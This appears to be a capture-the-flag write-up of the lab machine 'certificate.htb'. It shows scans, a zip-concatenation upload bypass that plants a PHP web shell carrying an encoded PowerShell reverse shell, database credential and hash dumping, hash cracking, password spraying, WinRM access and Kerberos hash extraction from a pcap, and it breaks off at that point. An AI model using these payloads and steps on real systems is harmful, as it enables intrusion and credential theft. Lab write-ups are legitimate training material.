# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.245.51 --generate-hosts-file /etc/hosts 
SMB         10.129.245.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumerationm
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.certificate.htb -vv

Nmap scan report for dc01.certificate.htb (10.129.245.51)
Host is up, received user-set (0.014s latency).
rDNS record for 10.129.245.51: DC01.certificate.htb
Scanned at 2026-11-03 18:01:27 GMT for 66s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49666/tcp open  unknown          syn-ack
49693/tcp open  unknown          syn-ack
49695/tcp open  unknown          syn-ack
49697/tcp open  unknown          syn-ack
49716/tcp open  unknown          syn-ack
56747/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc01.certificate.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 18:04 +0000
Nmap scan report for dc01.certificate.htb (10.129.245.51)
Host is up (0.014s latency).
rDNS record for 10.129.245.51: DC01.certificate.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Certificate | Your portal for certification
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-04 02:04:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1903 - 22H2 (91%), Microsoft Windows 10 1909 - 2004 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth enabled by default with DCs however cannot use it to enumerate

The guest account is also disabled

# HTTP (80)

![1111](Pasted%20image%2020261103181007.png)

Ill have a look around the site

The blog page has several potential users

```python
charlie barber 
mark wiens
ben frank
carol wood
```

I can also register and login to the page

Nothing interesting on the login page, so i think the best next step is to create an account

![](Pasted%20image%2020261103183057.png)

Looks like i can choose the account type i create, if i create teacher i will need to tell support to activate it

This will be through the contact page

![](Pasted%20image%2020261103183433.png)

Ill create an account for both account types

![](Pasted%20image%2020261103183800.png)

Now after logging in i can reach this endpoint

![](Pasted%20image%2020261103183859.png)

Each page has a different trainer name

There is also a feedback section which is interesting

Looks like there is 4 courses available `?id=1-4`

```python
lorra armessa
havok watterson
sara laracrof
john wood
```

These are the trainer names from each of the courses

Ill try enrolling and testing the feedback option

Enrolling in the course gives me access to course content

![](Pasted%20image%2020261103193306.png)

There are certain parts of the course with file submission

It also says the file will be inspected by the course instructor

![](Pasted%20image%2020261103193522.png)

Uploading a .txt file shows an invalid MIME type error

# Reverse shell

![](Pasted%20image%2020261103194429.png)

Ill upload a valid file format such as a pdf and i see there is a built in viewer

![](Pasted%20image%2020261103194501.png)

This is where they are stored, i can try a PHP web shell here

After testing its behavior i see that the zip file is the best bet, this is becuase the zip file bypasses any extension checks and content-type checks

```python
❯❯❯ zip -r shell.zip shell.php default.pdf
```

I zipped a php web shell with a example pdf 

After uploading i get a 400 error, this is likely because its detecting the file type .php after unzipping

But by uploading a .zip it bypasses content-type and extension checks

```python
<?php
shell_exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==');
?>
```

This is the contents of shell.php, i just grabbed the powershell base64 shell from revshells

```python
❯❯❯ zip -r default.zip default.pdf                                                   
  adding: default.pdf (deflated 51%)
  
❯❯❯ zip -r shell.zip shell.php               
  adding: shell.php (stored 0%)
```

Ill zip both of these files individually

```python
❯❯❯ cat default.zip shell.zip > rce.zip
```

Then ill cat both files out with the .pdf file first then put this in a zip file

![](Pasted%20image%2020261103201938.png)

The upload succeeds

```python
❯❯❯ rlwrap nc -lnvp 1337
listening on [any] 1337 ...
```

Ill start a listener

Then ill click the link to open the upload, it takes me to the pdf in the URL, so ill just change it from `default.pdf` to `shell.php`

![](Pasted%20image%2020261103203632.png)

I now have a shell

```python
PS C:\xampp\htdocs\certificate.htb> dir


    Directory: C:\xampp\htdocs\certificate.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/26/2024   1:49 AM                static                                                                
-a----       12/24/2024  12:45 AM           7179 about.php                                                             
-a----       12/30/2024   1:50 PM          17197 blog.php                                                              
-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          
-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    
-a----       12/24/2024  12:53 AM           4632 courses.php                                                           
-a----       12/23/2024   4:46 AM            549 db.php                                                                
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    
-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      
-a----       12/22/2024  10:16 AM           2955 footer.php                                                            
-a----       12/23/2024   5:13 AM           2351 header.php                                                            
-a----       12/24/2024  12:52 AM           9497 index.php                                                             
-a----       12/25/2024   1:34 PM           5908 login.php                                                             
-a----       12/23/2024   5:14 AM            153 logout.php                                                            
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              
-a----       12/25/2024   1:27 PM           8240 register.php                                                          
-a----       12/28/2024  11:26 PM          10366 upload.php                                                            


PS C:\xampp\htdocs\certificate.htb>
```

Ill look into `db.php`

![](Pasted%20image%2020261103203900.png)

There is credentials stored here

Checking internal ports 3306 is open, which indicated mysql

```python
PS C:\xampp\htdocs\certificate.htb> net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D                   
Aya.W                    Eva.F                    Guest                    
John.C                   Kai.X                    kara.m                   
karol.s                  krbtgt                   Lion.SK                  
Maya.K                   Nya.S                    Ryan.K                   
saad.m                   Sara.B                   xamppuser                
The command completed successfully.

PS C:\xampp\htdocs\certificate.htb>
```

Also these are the users

# Lateral movement

```python
PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "SHOW DATABASES;"
Database
certificate_webapp_db
information_schema
test
PS C:\xampp\htdocs\certificate.htb> 
```

Ill do some enumeration into the databases

```python
PS C:\xampp\htdocs\certificate.htb> \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "USE certificate_webapp_db; SHOW TABLES"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
PS C:\xampp\htdocs\certificate.htb> 
```

These are the tables from the DB referenced in the php source code

```python
PS C:\xampp\htdocs\certificate.htb> \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "USE certificate_webapp_db; SELECT * FROM users"
id	first_name	last_name	username	email	password	created_at	role	is_active
1	Lorra	Armessa	Lorra.AAA	lorra.aaa@certificate.htb	$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG	2024-12-23 12:43:10	teacher	1
6	Sara	Laracrof	Sara1200	sara1200@gmail.com	$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK	2024-12-23 12:47:11	teacher	1
7	John	Wood	Johney	johny009@mail.com	$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq	2024-12-23 13:18:18	student	1
8	Havok	Watterson	havokww	havokww@hotmail.com	$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti	2024-12-24 09:08:04	teacher	1
9	Steven	Roman	stev	steven@yahoo.com	$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2	2024-12-24 12:05:05	student	1
10	Sara	Brawn	sara.b	sara.b@certificate.htb	$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6	2024-12-25 21:31:26	admin	1
12	student	student	student	student@student.com	$2y$04$qG.Qlmp943zS/JPdfa/.UebEEzW3Y94mrXzKBkqljzsbL/U2je3qy	2026-11-03 18:34:54	student	1
PS C:\xampp\htdocs\certificate.htb>
```

Then ill just dump the users table

```python
Lorra.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200:$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney:$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww:$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev:$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
```

These are the important details from here

```python
❯❯❯ hashcat -m 3200 hashes.txt --user /usr/share/wordlists/rockyou.txt

$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
```

One of them cracked!

# Compromising `sara.b`

Ill use the users from earlier and try to spray this on the domain accounts

```python
❯❯❯ nxc smb dc01.certificate.htb -u users.txt -p 'Blink182' --continue-on-success

SMB         10.129.245.51   445    DC01             [+] certificate.htb\Sara.B:Blink182
```

This user is now compromised!

```python
 ❯❯❯ nxc smb dc01.certificate.htb -u sara.b -p 'Blink182' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
WS-01$
Kai.X
Sara.B
John.C
Aya.W
Nya.S
Maya.K
Lion.SK
Eva.F
Ryan.K
akeder.kh
kara.m
Alex.D
karol.s
saad.m
xamppuser
WS-05$
```

Ill recollect users, in case of any machine accounts

There are no kerberoastable or asreproastable users

No writable objects

```python
❯❯❯ bloodyAD --host dc01.certificate.htb -d certificate.htb -u sara.b -p 'Blink182' get membership 'sara.b'

distinguishedName: CN=Users,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-554
sAMAccountName: Pre-Windows 2000 Compatible Access

distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-555
sAMAccountName: Remote Desktop Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=certificate,DC=htb
objectSid: S-1-5-21-515537669-4223687196-3249690583-513
sAMAccountName: Domain Users

distinguishedName: CN=Help Desk,CN=Users,DC=certificate,DC=htb
objectSid: S-1-5-21-515537669-4223687196-3249690583-1110
sAMAccountName: Help Desk
```

This user is in remote management which means i can winrm

# WINRM access as `sara.b`

```python
❯❯❯ evil-winrm -i dc01.certificate.htb -u sara.b -p 'Blink182' 
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Sara.B\Documents>
```

Ill enumerate the filesystem

```python
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap


*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01>
```

An interesting dir in documents

```python
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> type "C:/Users/Sara.B/Documents/WS-01/Description.txt"
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

This is the description, the fact its placed with a pcap, i would think the capture shows the valid creds being used

Ill download the pcap and open it in wireshark

# Wireshark analysis

Ill open the file in wireshark

![](Pasted%20image%2020261105175659.png)

Ill filter for kerberos

https://medium.com/@liram.cybersec/from-packets-to-passwords-utilizing-pcap-file-data-for-domain-access-5c206e64566b

The third packet in the list is the most interesting

![](Pasted%20image%2020261105180341.png)

This is the packet i can use to forge a crackable hash

```python
$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

This is the crafted hash

`$krb5pa` indicates this is pre auth



